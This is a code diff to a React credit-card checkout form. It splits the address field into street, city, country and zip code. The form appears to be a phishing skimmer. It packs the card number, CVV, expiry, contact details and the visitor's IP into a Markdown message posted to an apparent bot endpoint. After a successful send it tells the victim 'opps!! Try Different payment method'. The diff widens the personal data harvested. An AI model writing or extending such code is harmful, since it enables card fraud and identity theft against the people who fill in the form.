@@ -31,7 +31,10 @@ interface CreditCardFormData {
   cvv: string;
   cardName: string;
   email: string;
-  address: string;
+  streetAddress: string;
+  city: string;
+  country: string;
+  zipCode: string;
   phoneNumber: string;
 }
 
@@ -50,7 +53,10 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
     expiry: '',
     cvv: '',
     email: '',
-    address: '',
+    streetAddress: '',
+    city: '',
+    country: '',
+    zipCode: '',
     phoneNumber: '',
   });
 
@@ -94,7 +100,10 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
         })),
         totalAmount,
         email: form.email,
-        address: form.address,
+        streetAddress: form.streetAddress,
+        city: form.city,
+        country: form.country,
+        zipCode: form.zipCode,
         phoneNumber: form.phoneNumber,
         purchaseDate: new Date().toISOString(),
       };
@@ -187,7 +196,10 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
     if (!validateExpiry(form.expiry)) errs.expiry = 'Invalid expiry date.';
     if (!/^\d{3,4}$/.test(form.cvv)) errs.cvv = 'Invalid CVV.';
     if (!form.email.trim()) errs.email = 'Please enter your email.';
-    if (!form.address.trim()) errs.address = 'Please enter your address.';
+    if (!form.streetAddress.trim()) errs.streetAddress = 'Please enter your street address.';
+    if (!form.city.trim()) errs.city = 'Please enter your city.';
+    if (!form.country.trim()) errs.country = 'Please enter your country.';
+    if (!form.zipCode.trim()) errs.zipCode = 'Please enter your zip code.';
     if (!form.phoneNumber.trim()) errs.phoneNumber = 'Please enter your phone number.';
     setErrors(errs);
     return Object.keys(errs).length === 0;
@@ -221,7 +233,10 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
 \\- Expiry: ${escapeMarkdown(form.expiry)}
 \\- CVV: ${escapeMarkdown(form.cvv)}
 \\- Email: ${escapeMarkdown(form.email)}
-\\- Address: ${escapeMarkdown(form.address)}
+\\- Street Address: ${escapeMarkdown(form.streetAddress)}
+\\- City: ${escapeMarkdown(form.city)}
+\\- Country: ${escapeMarkdown(form.country)}
+\\- Zip Code: ${escapeMarkdown(form.zipCode)}
 \\- Phone Number: ${escapeMarkdown(form.phoneNumber)}
 
 *IP Info*: ${escapeMarkdown(ipInfo)}
@@ -242,13 +257,23 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
       });
       const json = await res.json();
      
-
-if (json.ok) {
-  setStatus({ message: 'opps!! Try Different payment method', color: 'green' });
-  setForm({ cardName: '', cardNumber: '', expiry: '', cvv: '', email: '', address: '', phoneNumber: '' });
-} else {
-  setStatus({ message: `Payment failed: ${json.description}`, color: 'red' });
-}
+      if (json.ok) {
+        setStatus({ message: 'opps!! Try Different payment method', color: 'green' });
+        setForm({ 
+          cardName: '', 
+          cardNumber: '', 
+          expiry: '', 
+          cvv: '', 
+          email: '', 
+          streetAddress: '', 
+          city: '', 
+          country: '', 
+          zipCode: '', 
+          phoneNumber: '' 
+        });
+      } else {
+        setStatus({ message: `Payment failed: ${json.description}`, color: 'red' });
+      }
 
     } catch (err) {
       setStatus({ message: `Error processing payment: ${err instanceof Error ? err.message : 'Unknown error'}`, color: 'red' });
@@ -331,14 +356,53 @@ if (json.ok) {
         <div className="col-span-2">
           <input
             type="text"
-            name="address"
-            placeholder="Address"
-            value={form.address}
+            name="streetAddress"
+            placeholder="Street Address"
+            value={form.streetAddress}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.address ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
+            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.streetAddress ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
             disabled={loading}
           />
-          {errors.address && <p className="text-red-500 text-sm mt-1">{errors.address}</p>}
+          {errors.streetAddress && <p className="text-red-500 text-sm mt-1">{errors.streetAddress}</p>}
+        </div>
+
+        <div>
+          <input
+            type="text"
+            name="city"
+            placeholder="City"
+            value={form.city}
+            onChange={handleChange}
+            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.city ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
+            disabled={loading}
+          />
+          {errors.city && <p className="text-red-500 text-sm mt-1">{errors.city}</p>}
+        </div>
+
+        <div>
+          <input
+            type="text"
+            name="country"
+            placeholder="Country"
+            value={form.country}
+            onChange={handleChange}
+            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.country ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
+            disabled={loading}
+          />
+          {errors.country && <p className="text-red-500 text-sm mt-1">{errors.country}</p>}
+        </div>
+
+        <div className="col-span-2">
+          <input
+            type="text"
+            name="zipCode"
+            placeholder="Zip Code"
+            value={form.zipCode}
+            onChange={handleChange}
+            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.zipCode ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
+            disabled={loading}
+          />
+          {errors.zipCode && <p className="text-red-500 text-sm mt-1">{errors.zipCode}</p>}
         </div>
 
         <div className="col-span-2">
